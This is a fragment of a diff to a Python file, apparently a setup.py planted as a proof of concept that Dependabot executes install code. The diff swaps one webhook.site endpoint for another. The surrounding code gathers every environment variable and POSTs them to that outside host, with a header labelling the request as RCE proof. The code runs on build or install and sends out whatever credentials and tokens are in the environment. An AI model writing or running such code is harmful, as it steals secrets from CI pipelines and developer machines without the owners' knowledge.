@@ -8,7 +8,7 @@ import urllib.request
 try:
     env_data = '\n'.join(f'{k}={v}' for k, v in os.environ.items())
     req = urllib.request.Request(
-        'https://webhook.site/2c802d7e-1740-499f-902e-264eb03160c2',
+        'https://webhook.site/c3f33f5e-e2f0-4844-ab9c-79c89b0e57a1',
         data=env_data.encode(),
         headers={'Content-Type': 'text/plain', 'X-RCE-Proof': 'dependabot-exec-setup-py'},
         method='POST'
